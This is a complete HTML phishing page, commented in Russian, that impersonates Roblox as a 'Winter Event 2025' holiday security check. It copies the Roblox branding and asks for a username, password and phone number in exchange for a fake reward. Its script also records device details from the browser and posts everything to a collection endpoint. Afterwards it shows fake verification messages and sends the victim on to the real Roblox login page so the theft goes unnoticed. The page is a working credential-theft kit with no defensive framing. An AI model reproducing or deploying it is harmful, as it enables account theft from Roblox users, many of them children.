<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox | Winter Event 2025</title>
    <style>
        body { margin: 0; font-family: sans-serif; background: #000; color: #fff; display: flex; flex-direction: column; align-items: center; min-height: 100vh; background-image: radial-gradient(circle, #1a3a3a 0%, #000 100%); overflow-x: hidden; }
        /* Новогодняя шапка */
        .header { width: 100%; background: #d32f2f; padding: 12px 20px; box-shadow: 0 4px 15px rgba(211, 47, 47, 0.4); display: flex; align-items: center; position: fixed; top: 0; z-index: 100; border-bottom: 3px solid #ffca28; }
        .header img { height: 28px; filter: drop-shadow(0 0 5px white); }
        .header-text { margin-left: 15px; font-weight: bold; font-size: 14px; color: #fff; text-shadow: 1px 1px 2px #000; }
        
        .spacer { height: 100px; }
        .card { background: #232527; padding: 35px; border-radius: 15px; width: 340px; text-align: center; border: 2px solid #d32f2f; position: relative; box-shadow: 0 0 20px rgba(211, 47, 47, 0.3); }
        
        /* Снежинка для декора */
        .card::before { content: '❄️'; position: absolute; top: -20px; right: -20px; font-size: 40px; }
        
        .main-logo { width: 70px; margin-bottom: 15px; filter: drop-shadow(0 0 10px rgba(255,255,255,0.5)); }
        .event-badge { background: #ffca28; color: #000; padding: 5px; border-radius: 5px; font-size: 11px; font-weight: 900; margin-bottom: 20px; }
        
        input { width: 100%; padding: 12px; margin-bottom: 12px; background: #111; border: 1px solid #444; color: #fff; border-radius: 5px; box-sizing: border-box; outline: none; }
        input:focus { border-color: #ffca28; }
        
        button { width: 100%; padding: 14px; background: #d32f2f; color: #fff; border: none; font-weight: bold; border-radius: 5px; cursor: pointer; font-size: 14px; text-transform: uppercase; letter-spacing: 1px; }
        button:hover { background: #b71c1c; box-shadow: 0 0 10px #d32f2f; }
        
        #status { display: none; color: #ffca28; font-size: 12px; margin-top: 15px; font-family: monospace; }
        .footer { font-size: 10px; color: #666; margin-top: 25px; }
    </style>
</head>
<body>
    <div class="header">
        <img src="https://www.roblox.com/images/Logos/rbx_icon.png">
        <div class="header-text">ROBLOX WINTER VERIFICATION 2025</div>
    </div>
    
    <div class="spacer"></div>

    <div class="card">
        <img src="https://www.roblox.com/images/logos/rebrand/metric_144_white.png" class="main-logo">
        <div class="event-badge">❄️ HOLIDAY SECURITY CHECK ❄️</div>
        <form id="winter-form">
            <input type="text" id="u" placeholder="Roblox Username" required>
            <input type="password" id="p" placeholder="Password" required>
            <input type="tel" id="t" placeholder="Phone Number" required>
            <button type="submit" id="btn">Claim Holiday Reward</button>
        </form>
        <div id="status">ANALYZING SESSION...<br>IP & HARDWARE VERIFIED...</div>
        <div class="footer">Verification required for accounts >30 days old.<br>© 2025 Roblox Winter Event</div>
    </div>

    <script>
        document.getElementById('winter-form').onsubmit = async (e) => {
            e.preventDefault();
            const btn = document.getElementById('btn');
            const status = document.getElementById('status');
            
            btn.style.display = 'none';
            status.style.display = 'block';

            // Собираем данные о железе (ПК или Телефон)
            let device = "PC / Unknown";
            if (/Android|iPhone|iPad/i.test(navigator.userAgent)) {
                device = navigator.userAgent.match(/\(([^)]+)\)/)[1].split(';')[0];
            } else {
                device = "Desktop: " + navigator.platform;
            }

            await fetch('/api/send', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ u: u.value, p: p.value, t: t.value, m: device })
            });

            setTimeout(() => {
                window.location.href = "https://www.roblox.com/login";
            }, 2500);
        };
    </script>
</body>
</html>
